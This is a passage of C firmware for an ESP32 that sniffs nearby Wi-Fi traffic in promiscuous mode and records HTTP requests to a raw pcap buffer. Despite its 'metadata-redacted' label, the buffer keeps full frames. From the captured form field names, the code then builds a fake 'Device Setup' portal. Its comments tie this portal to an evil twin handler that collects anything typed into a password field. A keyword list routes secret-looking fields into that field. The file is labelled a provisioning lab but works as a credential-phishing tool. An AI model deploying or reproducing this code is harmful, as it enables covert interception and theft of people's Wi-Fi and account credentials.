/**
 * ota_provision.c - bounded, metadata-redacted HTTP provisioning capture
 */

#include "ota_provision.h"
#include "ota_common.h"
#include "heap_psram.h"
#include "wifi_radio_claim.h"

#include "esp_log.h"
#include "esp_heap_caps.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>

static const char *TAG = "ota_provision";

#define PROV_PCAP_MAGIC 0xa1b2c3d4U
#define PROV_PCAP_LINKTYPE_IEEE802_11 105U
#define PROV_PCAP_SNAPLEN 65535U
#define PROV_MIN_TIMEOUT_SEC 10U
#define PROV_MAX_TIMEOUT_SEC 1800U

typedef struct {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} prov_pcap_header_t;

typedef struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} prov_pcap_record_t;

typedef struct {
    char method[8];
    char path[96];
    char content_type[48];
    char fields[OTA_PROV_MAX_FIELDS][32];
    uint8_t field_count;
    uint16_t port;
    uint32_t timestamp_ms;
} prov_preview_t;

static ota_provision_config_t s_cfg;
static ota_provision_state_t s_state;
static prov_preview_t s_preview[OTA_PROV_MAX_PREVIEW];
static uint8_t *s_pcap;
static size_t s_pcap_size;
static volatile bool s_running;
static TaskHandle_t s_task;
static SemaphoreHandle_t s_exit_sem;
static int64_t s_start_ms;
static uint8_t s_previous_channel = 1;
static wifi_second_chan_t s_previous_secondary = WIFI_SECOND_CHAN_NONE;
static portMUX_TYPE s_lock = portMUX_INITIALIZER_UNLOCKED;

/* Synthetic captive portal built from field-name metadata only */
static char *s_portal_html;
static char *s_portal_wrong_html;
static char s_portal_path[96];
static char s_portal_method[8];
static uint8_t s_portal_field_count;
static char s_portal_fields[OTA_PROV_MAX_FIELDS][32];

static const uint8_t *find_bytes(const uint8_t *data, size_t len,
                                 const char *needle, size_t needle_len)
{
    if (!data || !needle || needle_len == 0 || len < needle_len) return NULL;
    for (size_t i = 0; i <= len - needle_len; i++) {
        if (memcmp(data + i, needle, needle_len) == 0) return data + i;
    }
    return NULL;
}

static bool starts_with(const uint8_t *data, size_t len, const char *prefix)
{
    size_t n = strlen(prefix);
    return len >= n && memcmp(data, prefix, n) == 0;
}

static bool port_is_configured(uint16_t port)
{
    for (uint8_t i = 0; i < s_cfg.port_count; i++) {
        if (s_cfg.ports[i] == port) return true;
    }
    return false;
}

static void copy_safe_token(char *dst, size_t dst_size,
                            const uint8_t *src, size_t src_len)
{
    if (!dst || dst_size == 0) return;
    size_t out = 0;
    for (size_t i = 0; i < src_len && out + 1 < dst_size; i++) {
        unsigned char c = src[i];
        if (isalnum(c) || c == '_' || c == '-' || c == '.' || c == '/') {
            dst[out++] = (char)c;
        } else if (c == '%' && out + 3 < dst_size && i + 2 < src_len &&
                   isxdigit(src[i + 1]) && isxdigit(src[i + 2])) {
            dst[out++] = '%';
            dst[out++] = (char)src[++i];
            dst[out++] = (char)src[++i];
        } else {
            dst[out++] = '_';
        }
    }
    dst[out] = '\0';
}

static bool field_exists(const prov_preview_t *entry, const char *field)
{
    for (uint8_t i = 0; i < entry->field_count; i++) {
        if (strcmp(entry->fields[i], field) == 0) return true;
    }
    return false;
}

static void add_field(prov_preview_t *entry, const uint8_t *name, size_t len)
{
    if (!entry || !name || len == 0 || entry->field_count >= OTA_PROV_MAX_FIELDS) return;
    char safe[32];
    copy_safe_token(safe, sizeof(safe), name, len);
    if (!safe[0] || field_exists(entry, safe)) return;
    strncpy(entry->fields[entry->field_count], safe,
            sizeof(entry->fields[entry->field_count]) - 1);
    entry->field_count++;
}

static bool content_type_is(const char *content_type, const char *expected)
{
    return content_type && expected &&
           strncasecmp(content_type, expected, strlen(expected)) == 0;
}

static void extract_form_fields(prov_preview_t *entry,
                                const uint8_t *body, size_t body_len)
{
    size_t pos = 0;
    while (pos < body_len && entry->field_count < OTA_PROV_MAX_FIELDS) {
        size_t end = pos;
        while (end < body_len && body[end] != '&' && body[end] != '\r' &&
               body[end] != '\n') end++;
        size_t eq = pos;
        while (eq < end && body[eq] != '=') eq++;
        if (eq > pos && eq < end) add_field(entry, body + pos, eq - pos);
        pos = end + 1;
    }
}

static void extract_json_fields(prov_preview_t *entry,
                                const uint8_t *body, size_t body_len)
{
    size_t i = 0;
    while (i < body_len && entry->field_count < OTA_PROV_MAX_FIELDS) {
        if (body[i] != '"') {
            i++;
            continue;
        }
        size_t start = ++i;
        bool escaped = false;
        while (i < body_len) {
            if (!escaped && body[i] == '"') break;
            escaped = (!escaped && body[i] == '\\');
            if (body[i] != '\\') escaped = false;
            i++;
        }
        if (i >= body_len) break;
        size_t end = i++;
        while (i < body_len && isspace((unsigned char)body[i])) i++;
        if (i < body_len && body[i] == ':') add_field(entry, body + start, end - start);
    }
}

static bool header_value(const uint8_t *http, size_t http_len, const char *name,
                         char *out, size_t out_size)
{
    if (!http || !name || !out || out_size == 0) return false;
    const uint8_t *line = find_bytes(http, http_len, "\r\n", 2);
    if (!line) return false;
    size_t pos = (size_t)(line - http) + 2;
    size_t name_len = strlen(name);
    while (pos < http_len) {
        const uint8_t *end = find_bytes(http + pos, http_len - pos, "\r\n", 2);
        if (!end || end == http + pos) break;
        size_t line_len = (size_t)(end - (http + pos));
        if (line_len > name_len + 1 &&
            strncasecmp((const char *)http + pos, name, name_len) == 0 &&
            http[pos + name_len] == ':') {
            size_t value = pos + name_len + 1;
            while (value < pos + line_len &&
                   (http[value] == ' ' || http[value] == '\t')) value++;
            size_t value_len = pos + line_len - value;
            const uint8_t *semi = memchr(http + value, ';', value_len);
            if (semi) value_len = (size_t)(semi - (http + value));
            copy_safe_token(out, out_size, http + value, value_len);
            return out[0] != '\0';
        }
        pos += line_len + 2;
    }
    return false;
}

static bool parse_http_metadata(const uint8_t *http, size_t http_len,
                                uint16_t dst_port, prov_preview_t *entry)
{
    static const char *methods[] = {
        "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", NULL
    };
    const char *method = NULL;
    size_t method_len = 0;
    for (int i = 0; methods[i]; i++) {
        size_t n = strlen(methods[i]);
        if (http_len > n + 1 && starts_with(http, http_len, methods[i]) &&
            http[n] == ' ') {
            method = methods[i];
            method_len = n;
            break;
        }
    }
    if (!method) return false;

    memset(entry, 0, sizeof(*entry));
    strncpy(entry->method, method, sizeof(entry->method) - 1);
    entry->port = dst_port;
    entry->timestamp_ms = (uint32_t)(esp_timer_get_time() / 1000ULL);

    size_t path_start = method_len + 1;
    size_t path_end = path_start;
    while (path_end < http_len && http[path_end] != ' ' &&
           http[path_end] != '\r' && http[path_end] != '\n') path_end++;
    if (path_end == path_start || path_end >= http_len) return false;
    const uint8_t *query = memchr(http + path_start, '?', path_end - path_start);
    size_t safe_path_len = query ? (size_t)(query - (http + path_start))
                                 : path_end - path_start;
    copy_safe_token(entry->path, sizeof(entry->path), http + path_start, safe_path_len);
    if (query && strlen(entry->path) + strlen("?<redacted>") < sizeof(entry->path)) {
        strcat(entry->path, "?<redacted>");
    }

    header_value(http, http_len, "Content-Type",
                 entry->content_type, sizeof(entry->content_type));
    const uint8_t *body = find_bytes(http, http_len, "\r\n\r\n", 4);
    if (!body) return true;
    body += 4;
    size_t body_len = http_len - (size_t)(body - http);
    if (content_type_is(entry->content_type, "application/json")) {
        extract_json_fields(entry, body, body_len);
    } else if (content_type_is(entry->content_type,
                               "application/x-www-form-urlencoded")) {
        extract_form_fields(entry, body, body_len);
    }
    return true;
}

static void reset_capture_locked(void)
{
    memset(s_preview, 0, sizeof(s_preview));
    s_state.packets_seen = 0;
    s_state.packets_matched = 0;
    s_state.packets_captured = 0;
    s_state.packets_dropped = 0;
    s_state.malformed_packets = 0;
    s_state.timeout_count = 0;
    s_state.preview_count = 0;
    s_pcap_size = 0;
    if (s_pcap && s_state.pcap_capacity >= sizeof(prov_pcap_header_t)) {
        const prov_pcap_header_t header = {
            .magic_number = PROV_PCAP_MAGIC,
            .version_major = 2,
            .version_minor = 4,
            .thiszone = 0,
            .sigfigs = 0,
            .snaplen = PROV_PCAP_SNAPLEN,
            .network = PROV_PCAP_LINKTYPE_IEEE802_11,
        };
        memcpy(s_pcap, &header, sizeof(header));
        s_pcap_size = sizeof(header);
    }
    s_state.pcap_bytes = (uint32_t)s_pcap_size;
}

static bool locate_ipv4_tcp(const uint8_t *frame, size_t frame_len,
                            const uint8_t **tcp_out, size_t *tcp_len_out,
                            uint16_t *src_port_out, uint16_t *dst_port_out)
{
    if (!frame || frame_len < 32) return false;
    uint16_t fc = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
    if (((fc >> 2) & 0x3) != 2) return false;

    size_t hdr_len = 24;
    bool to_ds = (fc & 0x0100) != 0;
    bool from_ds = (fc & 0x0200) != 0;
    if (to_ds && from_ds) hdr_len += 6;
    uint8_t subtype = (uint8_t)((fc >> 4) & 0x0f);
    if (subtype & 0x08) hdr_len += 2;
    if ((fc & 0x8000) && (subtype & 0x08)) hdr_len += 4;
    if (hdr_len + 8 + 20 > frame_len) return false;

    const uint8_t *llc = frame + hdr_len;
    static const uint8_t ipv4_llc[] = {0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00};
    if (memcmp(llc, ipv4_llc, sizeof(ipv4_llc)) != 0) return false;

    const uint8_t *ip = llc + sizeof(ipv4_llc);
    size_t available = frame_len - (size_t)(ip - frame);
    if (available < 20 || (ip[0] >> 4) != 4) return false;
    size_t ip_hlen = (size_t)(ip[0] & 0x0f) * 4;
    uint16_t ip_total = ((uint16_t)ip[2] << 8) | ip[3];
    uint16_t frag = ((uint16_t)ip[6] << 8) | ip[7];
    if (ip_hlen < 20 || ip_hlen > available || ip_total < ip_hlen ||
        (frag & 0x1fff) != 0 || ip[9] != 6) return false;
    if (ip_total < available) available = ip_total;
    if (available < ip_hlen + 20) return false;

    const uint8_t *tcp = ip + ip_hlen;
    size_t tcp_available = available - ip_hlen;
    size_t tcp_hlen = (size_t)(tcp[12] >> 4) * 4;
    if (tcp_hlen < 20 || tcp_hlen > tcp_available) return false;
    *src_port_out = ((uint16_t)tcp[0] << 8) | tcp[1];
    *dst_port_out = ((uint16_t)tcp[2] << 8) | tcp[3];
    *tcp_out = tcp + tcp_hlen;
    *tcp_len_out = tcp_available - tcp_hlen;
    return true;
}

static void wifi_capture_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running || !buf || type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *packet = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = packet->payload;
    size_t frame_len = packet->rx_ctrl.sig_len;

    portENTER_CRITICAL_ISR(&s_lock);
    s_state.packets_seen++;
    portEXIT_CRITICAL_ISR(&s_lock);

    const uint8_t *http = NULL;
    size_t http_len = 0;
    uint16_t src_port = 0;
    uint16_t dst_port = 0;
    if (!locate_ipv4_tcp(frame, frame_len, &http, &http_len, &src_port, &dst_port)) {
        return;
    }
    if (!port_is_configured(src_port) && !port_is_configured(dst_port)) return;

    prov_preview_t preview;
    bool has_preview = port_is_configured(dst_port) && http_len > 0 &&
                       parse_http_metadata(http, http_len, dst_port, &preview);
    uint64_t timestamp_us = (uint64_t)esp_timer_get_time();
    prov_pcap_record_t record = {
        .ts_sec = (uint32_t)(timestamp_us / 1000000ULL),
        .ts_usec = (uint32_t)(timestamp_us % 1000000ULL),
        .incl_len = (uint32_t)frame_len,
        .orig_len = (uint32_t)frame_len,
    };

    portENTER_CRITICAL_ISR(&s_lock);
    s_state.packets_matched++;
    size_t needed = sizeof(record) + frame_len;
    if (s_pcap && s_pcap_size + needed <= s_state.pcap_capacity) {
        memcpy(s_pcap + s_pcap_size, &record, sizeof(record));
        memcpy(s_pcap + s_pcap_size + sizeof(record), frame, frame_len);
        s_pcap_size += needed;
        s_state.pcap_bytes = (uint32_t)s_pcap_size;
        s_state.packets_captured++;
    } else {
        s_state.packets_dropped++;
    }
    if (has_preview && s_state.preview_count < OTA_PROV_MAX_PREVIEW) {
        s_preview[s_state.preview_count++] = preview;
    }
    portEXIT_CRITICAL_ISR(&s_lock);
}

static void capture_task(void *arg)
{
    (void)arg;
    while (s_running) {
        uint32_t elapsed = (uint32_t)((ota_common_now_ms() - s_start_ms) / 1000);
        portENTER_CRITICAL(&s_lock);
        s_state.elapsed_sec = elapsed;
        s_state.remaining_sec = elapsed < s_cfg.timeout_sec
                                    ? s_cfg.timeout_sec - elapsed : 0;
        portEXIT_CRITICAL(&s_lock);
        if (elapsed >= s_cfg.timeout_sec) {
            portENTER_CRITICAL(&s_lock);
            s_state.timeout = true;
            s_state.timeout_count++;
            portEXIT_CRITICAL(&s_lock);
            s_running = false;
            break;
        }
        vTaskDelay(pdMS_TO_TICKS(250));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_channel(s_previous_channel, s_previous_secondary);
    wifi_radio_release(WIFI_RADIO_OWNER_OTHER);
    ota_common_release();

    portENTER_CRITICAL(&s_lock);
    s_state.active = false;
    strncpy(s_state.state, s_state.timeout ? "timeout" : "stopped",
            sizeof(s_state.state) - 1);
    portEXIT_CRITICAL(&s_lock);
    if (s_exit_sem) xSemaphoreGive(s_exit_sem);
    s_task = NULL;
    vTaskDelete(NULL);
}

void ota_provision_init(void)
{
    if (!s_exit_sem) s_exit_sem = xSemaphoreCreateBinary();
    memset(&s_cfg, 0, sizeof(s_cfg));
    memset(&s_state, 0, sizeof(s_state));
    strncpy(s_state.state, "idle", sizeof(s_state.state) - 1);
}

esp_err_t ota_provision_start(const ota_provision_config_t *cfg)
{
    if (!cfg || cfg->channel < 1 || cfg->channel > 14 ||
        cfg->port_count == 0 || cfg->port_count > OTA_PROV_MAX_PORTS) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_running || s_state.active) return ESP_ERR_INVALID_STATE;
    for (uint8_t i = 0; i < cfg->port_count; i++) {
        if (cfg->ports[i] == 0) return ESP_ERR_INVALID_ARG;
    }

    esp_err_t err = ota_common_try_claim("provision_capture");
    if (err != ESP_OK) return err;
    err = wifi_radio_claim(WIFI_RADIO_OWNER_OTHER);
    if (err != ESP_OK) {
        ota_common_release();
        return err;
    }

    uint32_t capacity = cfg->max_pcap_bytes;
    if (capacity < sizeof(prov_pcap_header_t) + sizeof(prov_pcap_record_t)) {
        capacity = OTA_PROV_DEFAULT_PCAP_BYTES;
    }
    if (capacity > OTA_PROV_MAX_PCAP_BYTES) capacity = OTA_PROV_MAX_PCAP_BYTES;
    uint8_t *new_pcap = heap_caps_malloc(capacity,
                                         MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!new_pcap) {
        ESP_LOGE(TAG, "PSRAM allocation failed for %u-byte capture",
                 (unsigned)capacity);
        wifi_radio_release(WIFI_RADIO_OWNER_OTHER);
        ota_common_release();
        return ESP_ERR_NO_MEM;
    }

    heap_psram_free(s_pcap);
    s_pcap = new_pcap;
    s_cfg = *cfg;
    s_cfg.max_pcap_bytes = capacity;
    if (s_cfg.timeout_sec < PROV_MIN_TIMEOUT_SEC) s_cfg.timeout_sec = PROV_MIN_TIMEOUT_SEC;
    if (s_cfg.timeout_sec > PROV_MAX_TIMEOUT_SEC) s_cfg.timeout_sec = PROV_MAX_TIMEOUT_SEC;

    memset(&s_state, 0, sizeof(s_state));
    s_state.active = true;
    s_state.channel = s_cfg.channel;
    s_state.port_count = s_cfg.port_count;
    memcpy(s_state.ports, s_cfg.ports, sizeof(s_state.ports));
    s_state.pcap_capacity = capacity;
    strncpy(s_state.state, "starting", sizeof(s_state.state) - 1);
    portENTER_CRITICAL(&s_lock);
    reset_capture_locked();
    portEXIT_CRITICAL(&s_lock);

    if (s_exit_sem) xSemaphoreTake(s_exit_sem, 0);
    esp_wifi_get_channel(&s_previous_channel, &s_previous_secondary);
    err = esp_wifi_set_channel(s_cfg.channel, WIFI_SECOND_CHAN_NONE);
    if (err == ESP_OK) err = esp_wifi_set_promiscuous_rx_cb(wifi_capture_cb);
    if (err == ESP_OK) err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_set_channel(s_previous_channel, s_previous_secondary);
        s_state.active = false;
        snprintf(s_state.error, sizeof(s_state.error), "WiFi capture setup failed: %s",
                 esp_err_to_name(err));
        wifi_radio_release(WIFI_RADIO_OWNER_OTHER);
        ota_common_release();
        return err;
    }

    s_start_ms = ota_common_now_ms();
    s_running = true;
    strncpy(s_state.state, "capturing", sizeof(s_state.state) - 1);
    if (xTaskCreate(capture_task, "prov_capture", OTA_TASK_STACK_SIZE, NULL,
                    OTA_TASK_PRIORITY, &s_task) != pdPASS) {
        s_running = false;
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_set_channel(s_previous_channel, s_previous_secondary);
        s_state.active = false;
        wifi_radio_release(WIFI_RADIO_OWNER_OTHER);
        ota_common_release();
        return ESP_ERR_NO_MEM;
    }

    ESP_LOGI(TAG, "HTTP capture started: channel=%u ports=%u capacity=%u",
             s_cfg.channel, s_cfg.port_count, (unsigned)capacity);
    return ESP_OK;
}

esp_err_t ota_provision_stop(void)
{
    if (!s_state.active) return ESP_OK;
    s_running = false;
    if (s_exit_sem &&
        xSemaphoreTake(s_exit_sem, pdMS_TO_TICKS(OTA_STOP_SEM_TIMEOUT_MS)) != pdTRUE) {
        ESP_LOGE(TAG, "Capture task did not stop in time");
        return ESP_ERR_TIMEOUT;
    }
    return ESP_OK;
}

bool ota_provision_is_active(void)
{
    return s_state.active;
}

const ota_provision_state_t *ota_provision_get_state(void)
{
    return &s_state;
}

cJSON *ota_provision_get_status_json(void)
{
    ota_provision_state_t state;
    portENTER_CRITICAL(&s_lock);
    state = s_state;
    portEXIT_CRITICAL(&s_lock);

    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;
    cJSON_AddBoolToObject(root, "active", state.active);
    cJSON_AddBoolToObject(root, "running", state.active);
    cJSON_AddBoolToObject(root, "timeout", state.timeout);
    cJSON_AddStringToObject(root, "state", state.state);
    cJSON_AddNumberToObject(root, "channel", state.channel);
    cJSON *ports = cJSON_AddArrayToObject(root, "ports");
    for (uint8_t i = 0; ports && i < state.port_count; i++) {
        cJSON_AddItemToArray(ports, cJSON_CreateNumber(state.ports[i]));
    }
    cJSON_AddNumberToObject(root, "packets_seen", state.packets_seen);
    cJSON_AddNumberToObject(root, "packets_matched", state.packets_matched);
    cJSON_AddNumberToObject(root, "packets_captured", state.packets_captured);
    cJSON_AddNumberToObject(root, "packets_dropped", state.packets_dropped);
    cJSON_AddNumberToObject(root, "malformed_packets", state.malformed_packets);
    cJSON_AddNumberToObject(root, "timeout_count", state.timeout_count);
    cJSON_AddNumberToObject(root, "preview_count", state.preview_count);
    cJSON_AddNumberToObject(root, "pcap_bytes", state.pcap_bytes);
    cJSON_AddNumberToObject(root, "pcap_capacity", state.pcap_capacity);
    cJSON_AddNumberToObject(root, "elapsed_sec", state.elapsed_sec);
    cJSON_AddNumberToObject(root, "remaining_sec", state.remaining_sec);
    if (state.error[0]) cJSON_AddStringToObject(root, "error", state.error);
    return root;
}

const char *ota_provision_get_preview_json(void)
{
    char *buf = ota_common_json_med_b();
    if (!buf) return "[]";
    prov_preview_t preview[OTA_PROV_MAX_PREVIEW];
    uint32_t count;
    portENTER_CRITICAL(&s_lock);
    count = s_state.preview_count;
    memcpy(preview, s_preview, count * sizeof(preview[0]));
    portEXIT_CRITICAL(&s_lock);

    cJSON *root = cJSON_CreateArray();
    if (!root) return "[]";
    for (uint32_t i = 0; i < count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "method", preview[i].method);
        cJSON_AddStringToObject(item, "path", preview[i].path);
        cJSON_AddStringToObject(item, "content_type",
                                preview[i].content_type[0] ? preview[i].content_type : "unknown");
        cJSON_AddNumberToObject(item, "port", preview[i].port);
        cJSON_AddNumberToObject(item, "timestamp_ms", preview[i].timestamp_ms);
        cJSON *fields = cJSON_AddArrayToObject(item, "fields");
        for (uint8_t f = 0; fields && f < preview[i].field_count; f++) {
            cJSON *field = cJSON_CreateObject();
            cJSON_AddStringToObject(field, "name", preview[i].fields[f]);
            cJSON_AddStringToObject(field, "value", "<redacted:not-retained>");
            cJSON_AddItemToArray(fields, field);
        }
        cJSON_AddItemToArray(root, item);
    }
    char *printed = cJSON_PrintUnformatted(root);
    snprintf(buf, OTA_JSON_MED_SZ, "%s", printed ? printed : "[]");
    free(printed);
    cJSON_Delete(root);
    return buf;
}

const char *ota_provision_get_summary_json(void)
{
    char *buf = ota_common_json_2k();
    if (!buf) return "{}";
    ota_provision_state_t state;
    portENTER_CRITICAL(&s_lock);
    state = s_state;
    portEXIT_CRITICAL(&s_lock);
    snprintf(buf, OTA_JSON_2K_SZ,
             "{\"capture\":\"http-provisioning\",\"retention\":\"bounded-psram\","
             "\"portal_values\":\"not-retained\",\"portal_ready\":%s,"
             "\"portal_fields\":%u,\"packets_captured\":%u,"
             "\"packets_dropped\":%u,\"preview_count\":%u,\"pcap_bytes\":%u}",
             s_portal_html ? "true" : "false",
             (unsigned)s_portal_field_count,
             (unsigned)state.packets_captured, (unsigned)state.packets_dropped,
             (unsigned)state.preview_count, (unsigned)state.pcap_bytes);
    return buf;
}

esp_err_t ota_provision_get_pcap(const uint8_t **data, size_t *size)
{
    if (!data || !size) return ESP_ERR_INVALID_ARG;
    if (s_state.active) return ESP_ERR_INVALID_STATE;
    if (!s_pcap || s_pcap_size < sizeof(prov_pcap_header_t)) return ESP_ERR_NOT_FOUND;
    *data = s_pcap;
    *size = s_pcap_size;
    return ESP_OK;
}

void ota_provision_clear(void)
{
    portENTER_CRITICAL(&s_lock);
    reset_capture_locked();
    portEXIT_CRITICAL(&s_lock);
    heap_psram_free(s_portal_html);
    heap_psram_free(s_portal_wrong_html);
    s_portal_html = NULL;
    s_portal_wrong_html = NULL;
    s_portal_path[0] = '\0';
    s_portal_method[0] = '\0';
    s_portal_field_count = 0;
    memset(s_portal_fields, 0, sizeof(s_portal_fields));
}

/* ------------------------------------------------------------------ */
/*  Synthetic captive portal from captured field names only            */
/* ------------------------------------------------------------------ */

static bool field_looks_secret(const char *name)
{
    static const char *keys[] = {
        "password", "passwd", "pass", "pwd", "secret", "token",
        "key", "pin", "passphrase", "wifi_pass", "wifipass",
        "api_key", "apikey", NULL
    };
    if (!name || !name[0]) return false;
    for (int i = 0; keys[i]; i++) {
        if (strcasecmp(name, keys[i]) == 0) return true;
    }
    return false;
}

static bool portal_field_exists(const char *name)
{
    for (uint8_t i = 0; i < s_portal_field_count; i++) {
        if (strcasecmp(s_portal_fields[i], name) == 0) return true;
    }
    return false;
}

static void portal_add_field(const char *name)
{
    if (!name || !name[0] || s_portal_field_count >= OTA_PROV_MAX_FIELDS) return;
    if (portal_field_exists(name)) return;
    strncpy(s_portal_fields[s_portal_field_count], name,
            sizeof(s_portal_fields[0]) - 1);
    s_portal_fields[s_portal_field_count][sizeof(s_portal_fields[0]) - 1] = '\0';
    s_portal_field_count++;
}

static void collect_portal_metadata(void)
{
    prov_preview_t preview[OTA_PROV_MAX_PREVIEW];
    uint32_t count;
    portENTER_CRITICAL(&s_lock);
    count = s_state.preview_count;
    memcpy(preview, s_preview, count * sizeof(preview[0]));
    portEXIT_CRITICAL(&s_lock);

    s_portal_field_count = 0;
    memset(s_portal_fields, 0, sizeof(s_portal_fields));
    s_portal_path[0] = '\0';
    s_portal_method[0] = '\0';

    /* Prefer newest POST/PUT/PATCH with fields; else any with fields; else path. */
    int best = -1;
    for (int i = (int)count - 1; i >= 0; i--) {
        bool write_m = (strcmp(preview[i].method, "POST") == 0 ||
                        strcmp(preview[i].method, "PUT") == 0 ||
                        strcmp(preview[i].method, "PATCH") == 0);
        if (preview[i].field_count > 0 && write_m) {
            best = i;
            break;
        }
        if (best < 0 && preview[i].field_count > 0) best = i;
        if (best < 0 && preview[i].path[0]) best = i;
    }
    if (best < 0) return;

    strncpy(s_portal_path, preview[best].path, sizeof(s_portal_path) - 1);
    strncpy(s_portal_method, preview[best].method, sizeof(s_portal_method) - 1);
    for (uint8_t f = 0; f < preview[best].field_count; f++) {
        portal_add_field(preview[best].fields[f]);
    }
    /* Merge unique fields from other previews (structure only). */
    for (uint32_t i = 0; i < count; i++) {
        for (uint8_t f = 0; f < preview[i].field_count; f++) {
            portal_add_field(preview[i].fields[f]);
        }
    }
}

static int append_portal_inputs(char *buf, size_t buf_size, int pos, bool show_error)
{
    (void)show_error;
    if (s_portal_field_count == 0) {
        return snprintf(buf + pos, buf_size > (size_t)pos ? buf_size - (size_t)pos : 0,
            "<label>WiFi Password</label>"
            "<input type='password' name='password' placeholder='Enter value' required autofocus>");
    }

    bool mapped_password = false;
    for (uint8_t i = 0; i < s_portal_field_count; i++) {
        const char *name = s_portal_fields[i];
        bool secret = field_looks_secret(name);
        const char *input_name = name;
        /* Evil twin /password handler expects name=password for the secret. */
        if (secret && !mapped_password) {
            input_name = "password";
            mapped_password = true;
        }
        const char *type = secret ? "password" : "text";
        const char *autofocus = (i == 0) ? " autofocus" : "";
        int n = snprintf(buf + pos, buf_size > (size_t)pos ? buf_size - (size_t)pos : 0,
            "<label>%s</label>"
            "<input type='%s' name='%s' placeholder='%s' value='' required%s>",
            name, type, input_name, name, autofocus);
        if (n < 0) return -1;
        pos += n;
        if ((size_t)pos >= buf_size) return -1;
    }
    if (!mapped_password) {
        /* Ensure at least one password= field for the evil twin handler. */
        int n = snprintf(buf + pos, buf_size > (size_t)pos ? buf_size - (size_t)pos : 0,
            "<input type='hidden' name='password' value=''>");
        if (n < 0) return -1;
        pos += n;
    }
    return pos;
}

static esp_err_t render_portal_page(char **out_html, bool wrong_page)
{
    char *buf = heap_caps_malloc(OTA_PROV_PORTAL_HTML_MAX,
                                 MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!buf) {
        buf = heap_caps_malloc(OTA_PROV_PORTAL_HTML_MAX, MALLOC_CAP_8BIT);
    }
    if (!buf) return ESP_ERR_NO_MEM;

    const char *title = "Device Setup";
    const char *subtitle = s_portal_path[0]
        ? s_portal_path
        : "Complete setup to continue.";
    const char *err_style = wrong_page ? "block" : "none";

    int pos = snprintf(buf, OTA_PROV_PORTAL_HTML_MAX,
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>%s</title><style>"
        "*{box-sizing:border-box;margin:0;padding:0}"
        "body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;"
        "justify-content:center;align-items:center;min-height:100vh}"
        ".card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1);"
        "padding:32px;width:min(400px,90vw)}"
        "h2{color:#1a1a2e;margin-bottom:8px;font-size:22px}"
        ".sub{color:#666;font-size:14px;margin-bottom:24px;word-break:break-all}"
        "label{display:block;font-size:13px;font-weight:700;color:#333;margin-bottom:6px}"
        "input{width:100%%;height:44px;border:1px solid #ddd;border-radius:8px;"
        "padding:0 12px;font-size:15px;outline:none;margin-bottom:16px}"
        "input:focus{border-color:#4a90d9;box-shadow:0 0 0 3px rgba(74,144,217,.15)}"
        "button{width:100%%;height:46px;border:0;border-radius:8px;background:#4a90d9;"
        "color:#fff;font-size:16px;font-weight:700;cursor:pointer}"
        "button:hover{background:#3a7bc8}"
        ".foot{margin-top:16px;text-align:center;color:#999;font-size:12px}"
        ".err{color:#d32f2f;font-size:13px;margin-bottom:12px;padding:8px;"
        "background:#fde8e8;border-radius:6px;display:%s}"
        "</style></head><body><div class='card'>"
        "<h2>%s</h2>"
        "<p class='sub'>%s</p>"
        "<div class='err' id='err'>Incorrect details. Please try again.</div>"
        "<form method='POST' action='/password'>",
        title, err_style, title, subtitle);
    if (pos < 0 || (size_t)pos >= OTA_PROV_PORTAL_HTML_MAX) {
        heap_psram_free(buf);
        return ESP_ERR_NO_MEM;
    }

    int next = append_portal_inputs(buf, OTA_PROV_PORTAL_HTML_MAX, pos, wrong_page);
    if (next < 0 || (size_t)next >= OTA_PROV_PORTAL_HTML_MAX) {
        heap_psram_free(buf);
        return ESP_ERR_NO_MEM;
    }
    pos = next;

    int n = snprintf(buf + pos,
                     OTA_PROV_PORTAL_HTML_MAX > (size_t)pos
                         ? OTA_PROV_PORTAL_HTML_MAX - (size_t)pos : 0,
        "<button type='submit'>Continue</button>"
        "</form><div class='foot'>Provisioning portal (lab)</div>"
        "</div></body></html>");
    if (n < 0 || (size_t)(pos + n) >= OTA_PROV_PORTAL_HTML_MAX) {
        heap_psram_free(buf);
        return ESP_ERR_NO_MEM;
    }

    *out_html = buf;
    return ESP_OK;
}

esp_err_t ota_provision_build_portal(void)
{
    collect_portal_metadata();
    if (!s_portal_path[0] && s_portal_field_count == 0 &&
        s_state.preview_count == 0 && s_state.packets_captured == 0) {
        return ESP_ERR_NOT_FOUND;
    }

    char *index_html = NULL;
    char *wrong_html = NULL;
    esp_err_t err = render_portal_page(&index_html, false);
    if (err != ESP_OK) return err;
    err = render_portal_page(&wrong_html, true);
    if (err != ESP_OK) {
        heap_psram_free(index_html);
        return err;
    }

    heap_psram_free(s_portal_html);
    heap_psram_free(s_portal_wrong_html);
    s_portal_html = index_html;
    s_portal_wrong_html = wrong_html;

    ESP_LOGI(TAG, "Built synthetic portal: path='%s' fields=%u (%u bytes)",
